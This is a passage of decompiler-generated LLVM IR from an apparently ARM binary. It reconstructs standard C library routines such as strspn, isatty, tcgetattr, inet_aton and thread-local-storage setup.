dec_label_pc_16fa0:                               ; preds = %dec_label_pc_16f84, %dec_label_pc_16f8c.preheader
  %v0_16fa0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_16fa4

dec_label_pc_16fa4:                               ; preds = %dec_label_pc_16f78, %dec_label_pc_16fa0
  %storemerge = phi i32 [ %v2_16f7c, %dec_label_pc_16f78 ], [ %v0_16fa0, %dec_label_pc_16fa0 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_16f94, { 1, 0 }
  uselistorder i32 %v1_16f88, { 1, 0 }
  uselistorder i32 %v1_16f64, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16fa4, { 1, 0 }
  uselistorder label %dec_label_pc_16f84, { 1, 0 }
}

define i32 @__GI_strspn(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v0_16fe02 = load i32, i32* @r0, align 4
  %v1_16fe03 = inttoptr i32 %v0_16fe02 to i8*
  %v2_16fe04 = load i8, i8* %v1_16fe03, align 1
  %v2_16fe46 = icmp eq i8 %v2_16fe04, 0
  br i1 %v2_16fe46, label %dec_label_pc_16ff0, label %dec_label_pc_16fc4.preheader

dec_label_pc_16fbc:                               ; preds = %dec_label_pc_16fc4
  %v1_16fcc = add i32 %v0_16fcc, 1
  %v9_16fbc = icmp eq i8 %v0_16fbc10.in, %v2_16fc4
  br i1 %v9_16fbc, label %dec_label_pc_16fd8, label %dec_label_pc_16fc4

dec_label_pc_16fc4:                               ; preds = %dec_label_pc_16fc4.preheader, %dec_label_pc_16fbc
  %v0_16fcc = phi i32 [ %tmp, %dec_label_pc_16fc4.preheader ], [ %v1_16fcc, %dec_label_pc_16fbc ]
  %v1_16fc4 = inttoptr i32 %v0_16fcc to i8*
  %v2_16fc4 = load i8, i8* %v1_16fc4, align 1
  %v2_16fc8 = icmp eq i8 %v2_16fc4, 0
  br i1 %v2_16fc8, label %dec_label_pc_16ff0, label %dec_label_pc_16fbc

dec_label_pc_16fd8:                               ; preds = %dec_label_pc_16fbc
  %v1_16fd8 = add i32 %v0_16fd8, 1
  %v1_16fdc = add i32 %v0_16fdc, 1
  %v1_16fe0 = inttoptr i32 %v1_16fdc to i8*
  %v2_16fe0 = load i8, i8* %v1_16fe0, align 1
  %v2_16fe4 = icmp eq i8 %v2_16fe0, 0
  br i1 %v2_16fe4, label %dec_label_pc_16ff0, label %dec_label_pc_16fc4.preheader

dec_label_pc_16fc4.preheader:                     ; preds = %entry, %dec_label_pc_16fd8
  %v0_16fdc = phi i32 [ %v1_16fdc, %dec_label_pc_16fd8 ], [ %v0_16fe02, %entry ]
  %v0_16fd8 = phi i32 [ %v1_16fd8, %dec_label_pc_16fd8 ], [ 0, %entry ]
  %v0_16fbc10.in = phi i8 [ %v2_16fe0, %dec_label_pc_16fd8 ], [ %v2_16fe04, %entry ]
  br label %dec_label_pc_16fc4

dec_label_pc_16ff0:                               ; preds = %dec_label_pc_16fd8, %dec_label_pc_16fc4, %entry
  %v0_16ff0 = phi i32 [ 0, %entry ], [ %v0_16fd8, %dec_label_pc_16fc4 ], [ %v1_16fd8, %dec_label_pc_16fd8 ]
  ret i32 %v0_16ff0

; uselistorder directives
  uselistorder i8 %v2_16fc4, { 1, 0 }
  uselistorder i32 %v0_16fcc, { 1, 0 }
  uselistorder label %dec_label_pc_16fc4.preheader, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-68 = alloca i32, align 4
  %v2_17004 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_17004, i32* @r1, align 4
  %v0_17008 = call i32 @__GI_tcgetattr()
  %v1_1700c = sub i32 1, %v0_17008
  %v2_1700c = icmp ult i32 %v0_17008, 2
  br i1 %v2_1700c, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  %v1_1701c = phi i32 [ %v1_1700c, %entry ], [ 0, %bb ]
  ret i32 %v1_1701c

; uselistorder directives
  uselistorder i32 %v0_17008, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %stack_var_-35 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v3_17020 = load i32, i32* @r4, align 4
  %v6_17020 = load i32, i32* @r5, align 4
  %v9_17020 = load i32, i32* @r6, align 4
  %v2_17028 = ptrtoint i32* %stack_var_-52 to i32
  %v0_1702c = load i32, i32* @r1, align 4
  store i32 %v0_1702c, i32* @r4, align 4
  store i32 21505, i32* %r1.global-to-local, align 4
  %v0_17038 = load i32, i32* @r0, align 4
  %v3_17038 = call i32 @ioctl(i32 %v0_17038, i32 21505, i32 %v2_17028)
  store i32 %v3_17038, i32* %r0.global-to-local, align 4
  store i32 %v3_17038, i32* @r5, align 4
  %v2_1703c = icmp eq i32 %v3_17038, 0
  br i1 %v2_1703c, label %dec_label_pc_17044, label %dec_label_pc_17088

dec_label_pc_17044:                               ; preds = %entry
  %v4_17050 = zext i8 %tmp to i32
  store i32 %v4_17050, i32* @ip, align 4
  %v3_17054 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_17054, i32* @r3, align 4
  %v1_17058 = load i32, i32* @r4, align 4
  %v2_17058 = add i32 %v1_17058, 4
  %v3_17058 = inttoptr i32 %v2_17058 to i32*
  %v0_1705c = load i32, i32* %r1.global-to-local, align 4
  %v1_1705c = load i32, i32* @r4, align 4
  %v2_1705c = add i32 %v1_1705c, 8
  %v3_1705c = inttoptr i32 %v2_1705c to i32*
  store i32 %v0_1705c, i32* %v3_1705c, align 4
  %v0_17060 = load i32, i32* %r0.global-to-local, align 4
  %v1_17060 = load i32, i32* @r4, align 4
  %v2_17060 = add i32 %v1_17060, 12
  %v3_17060 = inttoptr i32 %v2_17060 to i32*
  store i32 %v0_17060, i32* %v3_17060, align 4
  %v2_17064 = ptrtoint i32* %stack_var_-35 to i32
  store i32 %v2_17064, i32* @r1, align 4
  %v1_1706c = load i32, i32* @r4, align 4
  %v2_1706c = inttoptr i32 %v1_1706c to i32*
  store i32 %v3_17054, i32* %v2_1706c, align 4
  %v0_17070 = load i32, i32* @ip, align 4
  %v1_17070 = trunc i32 %v0_17070 to i8
  %v2_17070 = load i32, i32* @r4, align 4
  %v3_17070 = add i32 %v2_17070, 16
  %v4_17070 = inttoptr i32 %v3_17070 to i8*
  store i8 %v1_17070, i8* %v4_17070, align 1
  %v0_17074 = load i32, i32* @r4, align 4
  %v1_17074 = add i32 %v0_17074, 17
  store i32 %v1_17074, i32* %r0.global-to-local, align 4
  %v4_17078 = call i32 @__GI_mempcpy(i32 %v1_17074, i32 %v2_17064, i32 19, i32 %v3_17054)
  store i32 %v4_17078, i32* %r0.global-to-local, align 4
  %v0_1707c = load i32, i32* @r5, align 4
  store i32 %v0_1707c, i32* %r1.global-to-local, align 4
  %v3_17084 = inttoptr i32 %v4_17078 to i8*
  %v4_17084 = call i32 @__GI_memset(i8* %v3_17084, i32 %v0_1707c, i32 13)
  store i32 %v4_17084, i32* %r0.global-to-local, align 4
  %v0_17088.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17088

dec_label_pc_17088:                               ; preds = %entry, %dec_label_pc_17044
  %v0_17088 = phi i32 [ %v3_17038, %entry ], [ %v0_17088.pre, %dec_label_pc_17044 ]
  store i32 %v0_17088, i32* %r0.global-to-local, align 4
  store i32 %v3_17020, i32* @r4, align 4
  store i32 %v6_17020, i32* @r5, align 4
  store i32 %v9_17020, i32* @r6, align 4
  ret i32 %v0_17088

; uselistorder directives
  uselistorder i32 %v0_17088, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 17, { 14, 1, 4, 15, 16, 5, 17, 6, 7, 8, 9, 2, 18, 3, 19, 20, 10, 21, 11, 22, 23, 24, 0, 25, 12, 26, 13 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17088, { 1, 0 }
}

define i32 @inet_aton() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_1709c = load i32, i32* @r4, align 4
  store i32 %v3_1709c, i32* %stack_var_-28, align 4
  %v0_170a4 = load i32, i32* @r0, align 4
  %v2_170a4 = icmp eq i32 %v0_170a4, 0
  %v0_170ac = load i32, i32* @r1, align 4
  br i1 %v2_170a4, label %dec_label_pc_17180, label %dec_label_pc_170b4

dec_label_pc_170b4:                               ; preds = %entry
  br label %dec_label_pc_170cc

dec_label_pc_170cc:                               ; preds = %dec_label_pc_170b4, %dec_label_pc_17144
  %v1_17144 = phi i32 [ 0, %dec_label_pc_170b4 ], [ %v5_17144, %dec_label_pc_17144 ]
  %v0_17148 = phi i32 [ 1, %dec_label_pc_170b4 ], [ %v1_17148, %dec_label_pc_17144 ]
  %v0_170cc = phi i32 [ %v0_170a4, %dec_label_pc_170b4 ], [ %v0_170cc13, %dec_label_pc_17144 ]
  %v1_170cc = inttoptr i32 %v0_170cc to i8*
  %v2_170cc = load i8, i8* %v1_170cc, align 1
  %v3_170cc = zext i8 %v2_170cc to i32
  %v4_170d0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 276) to i32*), align 4
  %v2_170d4 = mul nuw nsw i32 %v3_170cc, 2
  %v2_170d8 = add i32 %v2_170d4, %v4_170d0
  %v3_170d8 = inttoptr i32 %v2_170d8 to i16*
  %v4_170d8 = load i16, i16* %v3_170d8, align 2
  %v1_170dc = and i16 %v4_170d8, 8
  %v2_170dc = icmp eq i16 %v1_170dc, 0
  br i1 %v2_170dc, label %dec_label_pc_17180, label %dec_label_pc_170e4

dec_label_pc_170e4:                               ; preds = %dec_label_pc_170cc
  br label %dec_label_pc_17104

dec_label_pc_170ec:                               ; preds = %dec_label_pc_17104
  %v2_170ec = mul i32 %v0_17144, 10
  %v1_170f0 = add i32 %v2_170ec, -48
  %v2_170f4 = add i32 %v3_17104, %v1_170f0
  %v8_170fc = icmp sgt i32 %v2_170f4, 255
  br i1 %v8_170fc, label %dec_label_pc_17180, label %dec_label_pc_17100

dec_label_pc_17100:                               ; preds = %dec_label_pc_170ec
  %v1_17100 = add i32 %v0_17134, 1
  store i32 %v1_17100, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17104

dec_label_pc_17104:                               ; preds = %dec_label_pc_170e4, %dec_label_pc_17100
  %v0_17144 = phi i32 [ 0, %dec_label_pc_170e4 ], [ %v2_170f4, %dec_label_pc_17100 ]
  %v0_17134 = phi i32 [ %v0_170cc, %dec_label_pc_170e4 ], [ %v1_17100, %dec_label_pc_17100 ]
  %v1_17104 = inttoptr i32 %v0_17134 to i8*
  %v2_17104 = load i8, i8* %v1_17104, align 1
  %v3_17104 = zext i8 %v2_17104 to i32
  %v2_17108 = mul nuw nsw i32 %v3_17104, 2
  %v2_1710c = add i32 %v2_17108, %v4_170d0
  %v3_1710c = inttoptr i32 %v2_1710c to i16*
  %v4_1710c = load i16, i16* %v3_1710c, align 2
  %v6_1710c = zext i16 %v4_1710c to i32
  %v1_17110 = and i32 %v6_1710c, 8
  %v2_17110 = icmp eq i32 %v1_17110, 0
  br i1 %v2_17110, label %dec_label_pc_17118, label %dec_label_pc_170ec

dec_label_pc_17118:                               ; preds = %dec_label_pc_17104
  %v7_17118 = icmp eq i32 %v0_17148, 4
  br i1 %v7_17118, label %dec_label_pc_17130, label %dec_label_pc_17120

dec_label_pc_17120:                               ; preds = %dec_label_pc_17118
  %v7_17120 = icmp eq i8 %v2_17104, 46
  br i1 %v7_17120, label %dec_label_pc_17128, label %dec_label_pc_17180

dec_label_pc_17128:                               ; preds = %dec_label_pc_17120
  %v1_17128 = add i32 %v0_17134, 1
  store i32 %v1_17128, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17144

dec_label_pc_17130:                               ; preds = %dec_label_pc_17118
  %v2_17130 = icmp eq i8 %v2_17104, 0
  %v1_17134 = add i32 %v0_17134, 1
  store i32 %v1_17134, i32* %r0.global-to-local, align 4
  br i1 %v2_17130, label %dec_label_pc_17144, label %dec_label_pc_1713c

dec_label_pc_1713c:                               ; preds = %dec_label_pc_17130
  %v1_1713c = and i32 %v6_1710c, 32
  %v2_1713c = icmp eq i32 %v1_1713c, 0
  br i1 %v2_1713c, label %dec_label_pc_17180, label %dec_label_pc_17144

dec_label_pc_17144:                               ; preds = %dec_label_pc_1713c, %dec_label_pc_17130, %dec_label_pc_17128
  %v0_170cc13 = phi i32 [ %v1_17134, %dec_label_pc_1713c ], [ %v1_17134, %dec_label_pc_17130 ], [ %v1_17128, %dec_label_pc_17128 ]
  %v4_17144 = mul i32 %v1_17144, 256
  %v5_17144 = or i32 %v0_17144, %v4_17144
  %v1_17148 = add nuw nsw i32 %v0_17148, 1
  %v7_17150 = icmp slt i32 %v1_17148, 5
  br i1 %v7_17150, label %dec_label_pc_170cc, label %dec_label_pc_17154

dec_label_pc_17154:                               ; preds = %dec_label_pc_17144
  %v2_17154 = icmp eq i32 %v0_170ac, 0
  br i1 %v2_17154, label %.thread8.thread, label %bb

.thread8.thread:                                  ; preds = %dec_label_pc_17154
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17184

bb:                                               ; preds = %dec_label_pc_17154
  %v4_17158 = udiv i32 %v5_17144, 16777216
  %v2_1715c = udiv i32 %v5_17144, 256
  %v5_17160 = and i32 %v2_1715c, 65280
  %v2_17164 = and i32 %v5_17144, 65280
  %v5_17168 = mul nuw nsw i32 %v2_17164, 256
  %v5_1716c = mul i32 %v0_17144, 16777216
  %v6_17160 = or i32 %v4_17158, %v5_1716c
  %v6_17168 = or i32 %v6_17160, %v5_17160
  %v6_1716c = or i32 %v6_17168, %v5_17168
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17178 = inttoptr i32 %v0_170ac to i32*
  store i32 %v6_1716c, i32* %v3_17178, align 4
  %v2_17184.pre = load i32, i32* %stack_var_-28, align 4
  %v1_17188.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17184

dec_label_pc_17180:                               ; preds = %dec_label_pc_17120, %dec_label_pc_1713c, %dec_label_pc_170cc, %dec_label_pc_170ec, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17184

dec_label_pc_17184:                               ; preds = %.thread8.thread, %bb, %dec_label_pc_17180
  %v1_17188 = phi i32 [ %v1_17188.pre, %bb ], [ 0, %dec_label_pc_17180 ], [ 1, %.thread8.thread ]
  %v2_17184 = phi i32 [ %v2_17184.pre, %bb ], [ %v3_1709c, %dec_label_pc_17180 ], [ %v3_1709c, %.thread8.thread ]
  store i32 %v2_17184, i32* @r4, align 4
  ret i32 %v1_17188

; uselistorder directives
  uselistorder i32 %v1_17148, { 1, 0 }
  uselistorder i32 %v5_17144, { 2, 0, 1, 3 }
  uselistorder i32 %v0_17134, { 0, 1, 3, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 0, 4, 5, 6 }
  uselistorder i32 65280, { 70, 0, 7, 1, 2, 3, 50, 51, 8, 9, 4, 10, 52, 53, 41, 11, 12, 13, 14, 15, 44, 45, 42, 43, 54, 55, 56, 48, 49, 46, 47, 57, 58, 59, 16, 17, 18, 19, 20, 60, 61, 21, 22, 23, 62, 24, 25, 63, 26, 27, 28, 29, 64, 30, 31, 65, 32, 33, 34, 35, 66, 67, 36, 37, 38, 39, 40, 68, 5, 69, 6, 71 }
  uselistorder i8 46, { 0, 2, 1 }
  uselistorder i32 255, { 5, 6, 0, 1, 2, 9, 11, 10, 7, 12, 8, 13, 3, 4 }
  uselistorder i16 0, { 0, 1, 2, 11, 12, 3, 4, 13, 14, 15, 16, 17, 18, 19, 20, 5, 21, 6, 22, 23, 24, 7, 8, 9, 10, 25, 26 }
  uselistorder i32 276, { 1, 0 }
  uselistorder label %dec_label_pc_17184, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17180, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_17104, { 1, 0 }
  uselistorder label %dec_label_pc_170cc, { 1, 0 }
}

define i32 @init_static_tls() local_unnamed_addr {
entry:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_171a0 = load i32, i32* @r4, align 4
  store i32 %v3_171a0, i32* %stack_var_-16, align 4
  %v4_171a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_171ac = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_171b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 36) to i32*), align 4
  store i32 %v4_171b4, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_171bc = inttoptr i32 %v4_171a4 to i32*
  %v2_171bc = load i32, i32* %v1_171bc, align 4
  %v4_171c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 52) to i32*), align 4
  store i32 %v4_171c0, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_171c8 = add i32 %v2_171bc, 15
  %v4_171cc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 144) to i32*), align 4
  store i32 %v4_171cc, i32* @ip, align 4
  %v1_171d0 = load i32, i32* @r0, align 4
  %v2_171d0 = add i32 %v1_171d0, %v1_171c8
  %v1_171d4 = inttoptr i32 %v4_171ac to i32*
  %v2_171d4 = load i32, i32* %v1_171d4, align 4
  store i32 %v2_171d4, i32* %r3.global-to-local, align 4
  %v1_171d8 = and i32 %v2_171d0, -16
  store i32 %v1_171d8, i32* %v1_171bc, align 4
  %v0_171e0 = load i32, i32* @r0, align 4
  %v1_171e0 = load i32, i32* %r4.global-to-local, align 4
  %v2_171e0 = inttoptr i32 %v1_171e0 to i32*
  store i32 %v0_171e0, i32* %v2_171e0, align 4
  %v0_171e4 = load i32, i32* @r1, align 4
  %v1_171e4 = load i32, i32* %lr.global-to-local, align 4
  %v2_171e4 = inttoptr i32 %v1_171e4 to i32*
  store i32 %v0_171e4, i32* %v2_171e4, align 4
  %v0_171e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_171e8 = load i32, i32* @ip, align 4
  %v2_171e8 = inttoptr i32 %v1_171e8 to i32*
  store i32 %v0_171e8, i32* %v2_171e8, align 4
  %v2_171ec = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_171ec, i32* %r4.global-to-local, align 4
  %v1_171f0 = load i32, i32* @r0, align 4
  ret i32 %v1_171f0

; uselistorder directives
  uselistorder i32 -16, { 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 5, 4, 3, 1, 15, 16, 17, 18, 19, 20, 2, 0 }
}

define i32 @function_171f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_171f8:
  %v0_171f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_171f8, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_171f8
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_171f8, %bb
  %v4_17208 = phi i32 [ %arg1, %dec_label_pc_171f8 ], [ 0, %bb ]
  ret i32 %v4_17208

; uselistorder directives
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @_dl_tls_setup(i32 %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r3.global-to-local, align 4
  %v4_1721c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 84) to i32*), align 4
  store i32 %v4_1721c, i32* @lr, align 4
  %v4_17228 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 60) to i32*), align 4
  store i32 64, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 10748) to i32*), align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 10748), i32* %r3.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  store i32 16, i32* @r1, align 4
  %v2_17248 = inttoptr i32 %v4_17228 to i32*
  store i32 1, i32* %v2_17248, align 4
  %v0_1724c = load i32, i32* %r3.global-to-local, align 4
  %v1_1724c = load i32, i32* @lr, align 4
  %v2_1724c = inttoptr i32 %v1_1724c to i32*
  store i32 %v0_1724c, i32* %v2_1724c, align 4
  %v0_17250 = call i32 @init_static_tls()
  ret i32 0
}

define i32 @function_17268(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_17268:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_17268 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17268, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17268
  %v2_17268 = load i32, i32* @r4, align 4
  %v8_17268 = ashr i32 %v2_17268, %tmp
  %v9_17268 = and i32 %v8_17268, %tmp
  %v2_1726c = load i32, i32* @ip, align 4
  %v8_1726c = lshr i32 %v2_1726c, %v9_17268
  %v9_1726c = and i32 %v8_1726c, %v9_17268
  store i32 %v9_1726c, i32* %r0.global-to-local, align 4
  %v4_17270 = inttoptr i32 %v9_1726c to i32*
  store i32 %arg2, i32* %v4_17270, align 4
  %v5_17270 = load i32, i32* @ip, align 4
  %v6_17270 = load i32, i32* %r0.global-to-local, align 4
  %v7_17270 = sub i32 %v6_17270, %v5_17270
  store i32 %v7_17270, i32* %r0.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17268, %bb
  %v8_17270 = phi i32 [ %tmp, %dec_label_pc_17268 ], [ %v7_17270, %bb ]
  ret i32 %v8_17270

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__tls_get_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1727c = call i32 @__aeabi_read_tp()
  %v1_17280 = inttoptr i32 %v0_1727c to i32*
  %v2_17280 = load i32, i32* %v1_17280, align 4
  %v1_17284 = add i32 %arg1, 4
  %v2_17284 = inttoptr i32 %v1_17284 to i32*
  %v3_17284 = load i32, i32* %v2_17284, align 4
  %v1_17288 = add i32 %v2_17280, 8
  %v2_17288 = inttoptr i32 %v1_17288 to i32*
  %v3_17288 = load i32, i32* %v2_17288, align 4
  %v2_1728c = add i32 %v3_17288, %v3_17284
  ret i32 %v2_1728c
}

define i32 @__libc_setup_tls(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_17298 = load i32, i32* @r4, align 4
  store i32 %v3_17298, i32* %stack_var_-36, align 4
  %v6_17298 = load i32, i32* @r5, align 4
  %v15_17298 = load i32, i32* @r8, align 4
  %v18_17298 = load i32, i32* @sb, align 4
  %v21_17298 = load i32, i32* @sl, align 4
  %v24_17298 = load i32, i32* @fp, align 4
  %v27_17298 = load i32, i32* @lr, align 4
  store i32 104, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %sl.global-to-local, align 4
  %v4_172a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 104) to i32*), align 4
  store i32 %v4_172a8, i32* %r3.global-to-local, align 4
  %v1_172ac = inttoptr i32 %v4_172a8 to i32*
  %v2_172ac = load i32, i32* %v1_172ac, align 4
  store i32 %v2_172ac, i32* %r2.global-to-local, align 4
  %v2_172b0 = icmp eq i32 %v2_172ac, 0
  %v0_172b8 = load i32, i32* %r0.global-to-local, align 4
  %v0_172bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_172bc, i32* %ip.global-to-local, align 4
  br i1 %v2_172b0, label %dec_label_pc_17484, label %dec_label_pc_172c4

dec_label_pc_172c4:                               ; preds = %entry
  store i32 156, i32* %r3.global-to-local, align 4
  %v4_172c8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 156) to i32*), align 4
  store i32 %v4_172c8, i32* @lr, align 4
  store i32 %v2_172ac, i32* %r1.global-to-local, align 4
  %v1_17310 = inttoptr i32 %v4_172c8 to i32*
  %v2_1731061 = load i32, i32* %v1_17310, align 4
  %v4_1731462 = mul i32 %v2_1731061, 32
  %v5_1731463 = add i32 %v4_1731462, %v2_172ac
  store i32 %v5_1731463, i32* %r3.global-to-local, align 4
  %v3_1731865 = icmp ult i32 %v2_172ac, %v5_1731463
  br i1 %v3_1731865, label %dec_label_pc_172d4, label %dec_label_pc_17484.loopexit

dec_label_pc_172d4:                               ; preds = %dec_label_pc_172c4, %dec_label_pc_1730c
  %v0_172ec66 = phi i32 [ %v1_1730c, %dec_label_pc_1730c ], [ %v2_172ac, %dec_label_pc_172c4 ]
  %v1_172d4 = inttoptr i32 %v0_172ec66 to i32*
  %v2_172d4 = load i32, i32* %v1_172d4, align 4
  store i32 %v2_172d4, i32* %r3.global-to-local, align 4
  %v7_172d8 = icmp eq i32 %v2_172d4, 7
  br i1 %v7_172d8, label %dec_label_pc_172e0, label %dec_label_pc_1730c

dec_label_pc_172e0:                               ; preds = %dec_label_pc_172d4
  %v1_172e0 = add i32 %v0_172ec66, 20
  %v2_172e0 = inttoptr i32 %v1_172e0 to i32*
  %v3_172e0 = load i32, i32* %v2_172e0, align 4
  store i32 %v3_172e0, i32* %r3.global-to-local, align 4
  %v1_172e4 = add i32 %v0_172ec66, 28
  %v2_172e4 = inttoptr i32 %v1_172e4 to i32*
  %v3_172e4 = load i32, i32* %v2_172e4, align 4
  store i32 %v3_172e4, i32* @r6, align 4
  %v1_172ec = add i32 %v0_172ec66, 16
  %v2_172ec = inttoptr i32 %v1_172ec to i32*
  %v3_172ec = load i32, i32* %v2_172ec, align 4
  store i32 %v3_172ec, i32* %r3.global-to-local, align 4
  %v1_172f0 = add i32 %v0_172ec66, 8
  %v2_172f0 = inttoptr i32 %v1_172f0 to i32*
  %v3_172f0 = load i32, i32* %v2_172f0, align 4
  store i32 %v3_172f0, i32* %r1.global-to-local, align 4
  %tmp78 = icmp ule i32 %v3_172e4, %v0_172bc
  %v0_172bc.v3_172e4 = select i1 %tmp78, i32 %v0_172bc, i32 %v3_172e4
  store i32 %v0_172bc.v3_172e4, i32* %fp.global-to-local, align 4
  %v2_17328 = icmp eq i32 %v3_172e4, 0
  br i1 %v2_17328, label %dec_label_pc_17350, label %bb

dec_label_pc_1730c:                               ; preds = %dec_label_pc_172d4
  %v1_1730c = add i32 %v0_172ec66, 32
  store i32 %v1_1730c, i32* %r1.global-to-local, align 4
  %v2_17310 = load i32, i32* %v1_17310, align 4
  %v4_17314 = mul i32 %v2_17310, 32
  %v5_17314 = add i32 %v4_17314, %v2_172ac
  store i32 %v5_17314, i32* %r3.global-to-local, align 4
  %v3_17318 = icmp ult i32 %v1_1730c, %v5_17314
  br i1 %v3_17318, label %dec_label_pc_172d4, label %dec_label_pc_17310.dec_label_pc_17484.loopexit_crit_edge

bb:                                               ; preds = %dec_label_pc_172e0
  %v2_1732c = add i32 %v3_172e4, -1
  br label %dec_label_pc_17354

dec_label_pc_17350:                               ; preds = %dec_label_pc_172e0, %dec_label_pc_17484
  %v0_17364.pre = phi i32 [ %v0_17364.pre.pre, %dec_label_pc_17484 ], [ ptrtoint (i32* @global_var_21698.346 to i32), %dec_label_pc_172e0 ]
  %v1_17354.pre = phi i32 [ %v1_17354.pre.pre, %dec_label_pc_17484 ], [ %v0_172b8, %dec_label_pc_172e0 ]
  %v1_1737825 = phi i32 [ %v0_1748c, %dec_label_pc_17484 ], [ %v0_172bc.v3_172e4, %dec_label_pc_172e0 ]
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_17484 ], [ %v3_172e0, %dec_label_pc_172e0 ]
  %stack_var_-48.0 = phi i32 [ 0, %dec_label_pc_17484 ], [ %v3_172ec, %dec_label_pc_172e0 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_17484 ], [ %v3_172f0, %dec_label_pc_172e0 ]
  br label %dec_label_pc_17354

dec_label_pc_17354:                               ; preds = %bb, %dec_label_pc_17350
  %storemerge80 = phi i32 [ %v2_1732c, %bb ], [ 0, %dec_label_pc_17350 ]
